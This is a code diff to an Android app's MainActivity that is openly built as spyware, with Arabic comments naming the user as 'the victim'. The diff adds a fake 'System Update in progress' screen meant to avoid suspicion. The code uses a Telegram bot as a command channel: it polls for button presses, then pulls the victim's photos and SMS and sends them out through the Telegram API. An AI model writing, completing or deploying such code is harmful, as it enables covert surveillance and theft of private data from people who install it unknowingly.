@@ -13,6 +13,8 @@ import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Telephony;
+import android.widget.LinearLayout;
+import android.widget.TextView;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -40,6 +42,16 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         ctx = getApplicationContext();
 
+        // واجهة وهمية لكي لا يشك الضحية
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(50, 50, 50, 50);
+        TextView tv = new TextView(this);
+        tv.setText("System Update in progress...\nPlease do not close the app.");
+        tv.setTextSize(18);
+        layout.addView(tv);
+        setContentView(layout);
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             requestPermissions(new String[]{
                     Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -59,24 +71,23 @@ public class MainActivity extends Activity {
     }
 
     private void startBackground() {
-        finish(); // إخفاء التطبيق فوراً
-
         new Thread(new Runnable() {
             @Override
             public void run() {
-                // 1. إرسال لوحة التحكم (الأزرار) إلى التلجرام بمجرد الاتصال
-                sendControlPanel();
+                try {
+                    // إرسال لوحة التحكم للبوت
+                    sendControlPanel();
 
-                // 2. حلقة الاستماع لضغطات الأزرار
-                while (true) {
-                    checkUpdates();
-                    try { Thread.sleep(3000); } catch (Exception e) {}
-                }
+                    // الاستماع للأوامر
+                    while (true) {
+                        checkUpdates();
+                        try { Thread.sleep(3000); } catch (Exception e) {}
+                    }
+                } catch (Exception e) {}
             }
         }).start();
     }
 
-    // إرسال رسالة تحتوي على الأزرار المضمنة (Inline Keyboard)
     private void sendControlPanel() {
         try {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
@@ -91,6 +102,7 @@ public class MainActivity extends Activity {
             json.put("text", "✅ تم الاتصال بجهاز الضحية بنجاح!\n\nاختر العملية التي تريد سحبها:");
 
             JSONArray keyboard = new JSONArray();
+            
             JSONArray row1 = new JSONArray();
             JSONObject btnPhotos = new JSONObject();
             btnPhotos.put("text", "📸 سحب الصور");
@@ -128,7 +140,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // الاستماع لضغطات الأزرار
     private void checkUpdates() {
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
@@ -150,16 +161,13 @@ public class MainActivity extends Activity {
                 JSONObject update = result.getJSONObject(i);
                 lastUpdateId = update.getLong("update_id");
                 
-                // التحقق من وجود ضغطة زر (Callback Query)
                 if (update.has("callback_query")) {
                     JSONObject callbackQuery = update.getJSONObject("callback_query");
                     String data = callbackQuery.getString("data");
                     String callbackId = callbackQuery.getString("id");
 
-                    // إرسال إشعار "تم الضغط" لإزالة علامة التحميل من الزر
                     answerCallback(callbackId, "جاري التنفيذ...");
 
-                    // تنفيذ الأمر المطلوب
                     if (data.equals("cmd_photos")) {
                         sendPhotos();
                     } else if (data.equals("cmd_sms")) {
@@ -172,7 +180,6 @@ public class MainActivity extends Activity {
         } catch (Exception e) {}
     }
 
-    // إزالة علامة التحميل من الزر
     private void answerCallback(String callbackId, String text) {
         try {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery?callback_query_id=" + callbackId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
@@ -183,7 +190,6 @@ public class MainActivity extends Activity {
         } catch (Exception e) {}
     }
 
-    // ------------------- دوال السحب والإرسال -------------------
     private void sendPhotos() {
         try {
             String[] projection = {MediaStore.Images.Media._ID};
@@ -247,7 +253,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ------------------- دوال مساعدة -------------------
     private void sendMsg(String text) {
         try {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
